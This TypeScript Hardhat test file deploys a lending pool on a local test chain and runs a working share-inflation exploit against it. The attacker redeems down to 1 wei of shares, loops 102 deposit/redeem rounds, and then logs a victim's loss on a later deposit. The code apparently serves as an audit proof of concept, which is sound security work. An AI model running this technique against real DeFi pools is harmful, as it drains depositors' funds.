import { expect } from "chai";
import { ethers, network } from "hardhat";
import * as helpers from "@nomicfoundation/hardhat-network-helpers";

import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/dist/src/signer-with-address";

import {
  TestERC20,
  TestERC721,
  TestProxy,
  TestLoanReceipt,
  TestDelegateRegistryV1,
  TestDelegateRegistryV2,
  ExternalCollateralLiquidator,
  Pool,
  ERC20DepositTokenImplementation,
} from "../typechain";

import { getContractFactoryWithLibraries } from "./helpers/Deploy";
import { extractEvent, expectEvent } from "./helpers/EventUtilities";
import { FixedPoint } from "./helpers/FixedPoint";
import { Tick } from "./helpers/Tick";
import { Signer } from "ethers";

describe("Pool Attack", function () {
  let accounts: SignerWithAddress[];
  let tok1: TestERC20;
  let nft1: TestERC721;
  let loanReceiptLib: TestLoanReceipt;
  let collateralLiquidator: ExternalCollateralLiquidator;
  let poolImpl: Pool;
  let pool: Pool;
  let snapshotId: string;
  let attacker: SignerWithAddress;
  let victim: SignerWithAddress;
  let delegateRegistryV1: TestDelegateRegistryV1;
  let delegateRegistryV2: TestDelegateRegistryV2;
  let erc20DepositTokenImpl: ERC20DepositTokenImplementation;

  before("deploy fixture", async () => {
    accounts = await ethers.getSigners();

    const testERC20Factory = await ethers.getContractFactory("TestERC20");
    const testERC721Factory = await ethers.getContractFactory("TestERC721");
    const testLoanReceiptFactory = await ethers.getContractFactory("TestLoanReceipt");
    const testProxyFactory = await ethers.getContractFactory("TestProxy");
    const externalCollateralLiquidatorFactory = await ethers.getContractFactory("ExternalCollateralLiquidator");
    const delegateRegistryV1Factory = await ethers.getContractFactory("TestDelegateRegistryV1");
    const delegateRegistryV2Factory = await ethers.getContractFactory("TestDelegateRegistryV2");
    const erc20DepositTokenImplFactory = await ethers.getContractFactory("ERC20DepositTokenImplementation");
    const poolImplFactory = await getContractFactoryWithLibraries("WeightedRateCollectionPool", [
      "LiquidityLogic",
      "DepositLogic",
      "BorrowLogic",
      "ERC20DepositTokenFactory",
    ]);

    /* Deploy test currency token */
    tok1 = (await testERC20Factory.deploy("Token 1", "TOK1", 18, ethers.utils.parseEther("10000000"))) as TestERC20;
    await tok1.deployed();

    /* Deploy test NFT */
    nft1 = (await testERC721Factory.deploy("NFT 1", "NFT1", "https://nft1.com/token/")) as TestERC721;
    await nft1.deployed();

    /* Deploy loan receipt library */
    loanReceiptLib = await testLoanReceiptFactory.deploy();
    await loanReceiptLib.deployed();

    /* Deploy external collateral liquidator implementation */
    const collateralLiquidatorImpl = await externalCollateralLiquidatorFactory.deploy();
    await collateralLiquidatorImpl.deployed();

    /* Deploy collateral liquidator */
    let proxy = await testProxyFactory.deploy(
      collateralLiquidatorImpl.address,
      collateralLiquidatorImpl.interface.encodeFunctionData("initialize")
    );
    await proxy.deployed();
    collateralLiquidator = (await ethers.getContractAt(
      "ExternalCollateralLiquidator",
      proxy.address
    )) as ExternalCollateralLiquidator;

    /* Deploy test delegation registry v1 */
    delegateRegistryV1 = await delegateRegistryV1Factory.deploy();
    await delegateRegistryV1.deployed();

    /* Deploy test delegation registry v2 */
    delegateRegistryV2 = await delegateRegistryV2Factory.deploy();
    await delegateRegistryV2.deployed();

    /* Deploy erc20 deposit token implementation */
    erc20DepositTokenImpl = (await erc20DepositTokenImplFactory.deploy()) as ERC20DepositTokenImplementation;
    await erc20DepositTokenImpl.deployed();

    /* Deploy pool implementation */
    poolImpl = (await poolImplFactory.deploy(
      collateralLiquidator.address,
      delegateRegistryV1.address,
      delegateRegistryV2.address,
      erc20DepositTokenImpl.address,
      []
    )) as Pool;
    await poolImpl.deployed();

    /* Deploy pool */
    proxy = await testProxyFactory.deploy(
      poolImpl.address,
      poolImpl.interface.encodeFunctionData("initialize", [
        ethers.utils.defaultAbiCoder.encode(
          ["address[]", "address", "address", "uint64[]", "uint64[]"],
          [
            [nft1.address],
            tok1.address,
            ethers.constants.AddressZero,
            [62208000, 31104000, 15552000, 7776000, 5184000, 2592000, 604800, 259200],
            [
              "951293759",
              "1585489599",
              "3170979198",
              "6341958396",
              "9512937595",
              "15854895991",
              "31709791983",
              "95129375951",
            ],
          ]
        ),
      ])
    );
    await proxy.deployed();
    pool = (await ethers.getContractAt("Pool", proxy.address)) as Pool;

    /* Arrange accounts */
    attacker = accounts[0];
    victim = accounts[1];

    /* Transfer TOK1 to attacker and victim and approve Pool */
    await tok1.transfer(attacker.address, ethers.utils.parseEther("1000000"));
    await tok1.connect(attacker).approve(pool.address, ethers.constants.MaxUint256);

    await tok1.transfer(victim.address, ethers.utils.parseEther("100000"));
    await tok1.connect(victim).approve(pool.address, ethers.constants.MaxUint256);

    /* Mint NFT to borrower */
    await nft1.mint(attacker.address, 123);

    /* Approve pool to transfer NFT */
    await nft1.connect(attacker).setApprovalForAll(pool.address, true);
  });

  beforeEach("snapshot blockchain", async () => {
    snapshotId = await network.provider.send("evm_snapshot", []);
  });

  afterEach("restore blockchain snapshot", async () => {
    await network.provider.send("evm_revert", [snapshotId]);
  });

  describe("#attack", async function () {
    it("attack", async function () {
      const tick1 = "1280000000000000000076";
      const tick2 = "2560000000000000000076";
      const oneEther = ethers.utils.parseEther("1");

      // attacker deposit
      await pool.connect(attacker).deposit(tick1, oneEther, 0);

      // attacker borrow
      const borrowTx = await pool
        .connect(attacker)
        .borrow(oneEther, "15552000", nft1.address, "123", oneEther.mul(2), [tick1, tick2], "0x");
      const loanReceipt = (await extractEvent(borrowTx, pool, "LoanOriginated")).args.loanReceipt;

      // fast forward 12 seconds
      await helpers.time.increase(12);

      // attacker repay
      await pool.connect(attacker).repay(loanReceipt);

      // attacker redeem all but 1 wei of shares
      const attackShares = (await pool.deposits(attacker.address, tick1)).shares;
      await pool.connect(attacker).redeem(tick1, attackShares.sub(1));

      // loop interations
      const loops = 102;

      // attacker loop inflate shares
      console.log("Loop shares inflation:");
      for (let i = 0; i < loops; i++) {
        const node = await pool.liquidityNode(tick1);

        const deposit = node.value.mul(2).sub(1);
        console.log(`${i} - node.value: ${node.value.toString()}, node.shares: ${node.shares.toString()}`);

        // simulate shares minted
        const shares = await pool.connect(attacker).callStatic.deposit(tick1, deposit, 0);

        await pool.connect(attacker).deposit(tick1, deposit, 0);

        await pool.connect(attacker).redeem(tick1, shares);
      }

      const victimDeposit = ethers.utils.parseEther("2.8");

      // simulate shares minted
      const shares = await pool.connect(victim).callStatic.deposit(tick1, victimDeposit, 0);

      // victim deposit
      await pool.connect(victim).deposit(tick1, victimDeposit, 0);

      const node = await pool.liquidityNode(tick1);
      console.log(
        `\nAfter Victim Deposit:\nnode.value: ${node.value.toString()}, node.shares: ${node.shares.toString()}`
      );

      // victim redeem and withdraw
      await pool.connect(victim).redeem(tick1, shares);
      const withdrawTx = await pool.connect(victim).withdraw(tick1, 0);
      const withdrawnAmount = (await extractEvent(withdrawTx, pool, "Withdrawn")).args.amount;
      console.log("victim loss:", victimDeposit.sub(withdrawnAmount));
    });
  });
});
